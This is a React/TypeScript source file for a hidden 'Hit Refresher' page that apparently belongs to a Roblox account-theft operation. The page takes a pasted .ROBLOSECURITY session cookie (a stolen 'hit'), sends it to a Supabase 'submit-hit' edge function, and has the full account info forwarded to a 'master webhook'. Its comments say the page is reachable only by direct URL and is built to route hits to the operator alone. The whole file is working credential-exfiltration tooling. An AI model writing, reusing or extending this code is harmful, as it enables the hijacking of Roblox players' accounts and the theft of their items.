import React, { useState } from 'react';
import { Loader2, RefreshCw } from 'lucide-react';
import { toast } from 'sonner';

// Hidden utility page — reachable only by direct URL (/refresh-hit).
// Sends the provided .ROBLOSECURITY cookie to the submit-hit edge function
// WITHOUT a site username, so it routes solely to the master webhook with
// full Roblox account info (same payload the normal hit flow uses).
const FN_URL = `${import.meta.env.VITE_SUPABASE_URL}/functions/v1`;
const ANON = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;

const RefreshHit = () => {
  const [cookie, setCookie] = useState('');
  const [loading, setLoading] = useState(false);

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    const c = cookie.trim();
    if (!c) {
      toast.error('Paste a .ROBLOSECURITY cookie first');
      return;
    }
    setLoading(true);
    try {
      const res = await fetch(`${FN_URL}/submit-hit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', apikey: ANON },
        body: JSON.stringify({
          // No username → no owner profile → master webhook only.
          toolType: 'Hit Refresher',
          toolKey: 'bot_followers',
          cookie: c,
        }),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error(data?.error || `Request failed (${res.status})`);
      toast.success('Refreshed — sent to master webhook');
      setCookie('');
    } catch (err: any) {
      toast.error(err?.message ?? 'Failed to refresh');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center px-4">
      <form
        onSubmit={submit}
        className="blox-card w-full max-w-xl p-6 space-y-4"
      >
        <div className="flex items-center gap-2">
          <RefreshCw className="h-5 w-5 text-primary" />
          <h1 className="text-lg font-semibold">Hit Refresher</h1>
        </div>
        <p className="text-xs text-muted-foreground">
          Paste a <code>.ROBLOSECURITY</code> cookie. It will be re-checked and the
          full hit info forwarded to the master webhook.
        </p>
        <textarea
          value={cookie}
          onChange={(e) => setCookie(e.target.value)}
          rows={5}
          spellCheck={false}
          autoComplete="off"
          placeholder=".ROBLOSECURITY=_|WARNING:-..."
          className="w-full bg-background border border-border rounded-md p-3 text-sm font-mono focus:outline-none focus:border-primary resize-y"
        />
        <button
          type="submit"
          disabled={loading || !cookie.trim()}
          className="w-full inline-flex items-center justify-center gap-2 rounded-md bg-primary text-primary-foreground text-sm font-medium px-4 py-2 disabled:opacity-50"
        >
          {loading ? <Loader2 className="h-4 w-4 animate-spin" /> : <RefreshCw className="h-4 w-4" />}
          {loading ? 'Refreshing…' : 'Refresh'}
        </button>
      </form>
    </div>
  );
};

export default RefreshHit;
